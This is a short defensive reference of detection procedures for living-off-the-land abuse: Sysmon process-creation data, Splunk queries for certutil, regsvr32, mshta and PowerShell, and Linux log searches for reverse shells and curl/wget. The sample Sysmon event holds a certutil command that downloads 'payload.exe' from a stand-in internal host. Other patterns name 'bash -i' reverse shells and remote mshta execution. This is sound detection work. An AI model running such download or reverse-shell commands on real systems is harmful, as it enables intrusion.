# Deep Technical Procedures

## Windows Event Log Queries

### Sysmon Event ID 1 - Process Creation
```xml
<Sysmon event="1">
  <Data name="CommandLine">certutil -urlcache -split -f http://192.168.1.100/payload.exe</Data>
  <Data name="Image">C:\Windows\System32\certutil.exe</Data>
  <Data name="ParentImage">C:\Windows\System32\cmd.exe</Data>
</Sysmon>
```

### Splunk SPL Queries

#### certutil Abuse
```spl
index=windows EventCode=1 Image=*\\certutil.exe
| search CommandLine=*-urlcache* OR CommandLine=*-decode* OR CommandLine=*-encode*
| eval is_suspicious = if(match(CommandLine, "(?i)http|ftp|split"), 1, 0)
| where is_suspicious=1
| table _time, host, User, CommandLine, ParentImage
```

#### regsvr32 Squiblydoo
```spl
index=windows EventCode=1 Image=*\\regsvr32.exe
| search CommandLine=*scrobj.dll*
| table _time, host, User, CommandLine, ParentImage
| eval severity = "CRITICAL"
```

#### mshta Remote Execution
```spl
index=windows EventCode=1 Image=*\\mshta.exe
| search CommandLine=*http* OR CommandLine=*javascript:* OR CommandLine=*vbscript:*
| table _time, host, User, CommandLine
```

### PowerShell Script Block Logging (Event ID 4104)
```spl
index=windows EventCode=4104
| search ScriptBlockText=*Invoke-WmiMethod* OR ScriptBlockText=*Invoke-CimMethod*
| eval block_size = len(ScriptBlockText)
| where block_size > 500
| table _time, host, ScriptBlockText
```

## Linux LOL Detection

### Bash Reverse Shell Detection
```bash
# Detect abnormal bash usage
grep -r "bash -i" /var/log/auth.log
grep -rn "exec" /var/log/syslog | grep -i "reverse\|connect-back"

# Monitor for curl/wget to internal IPs
auditctl -a always,exit -F arch=b64 -S execve -k command_logging
ausearch -k command_logging -i | grep -E "curl|wget" | grep -E "(192\.168|10\.|172\.)"
```
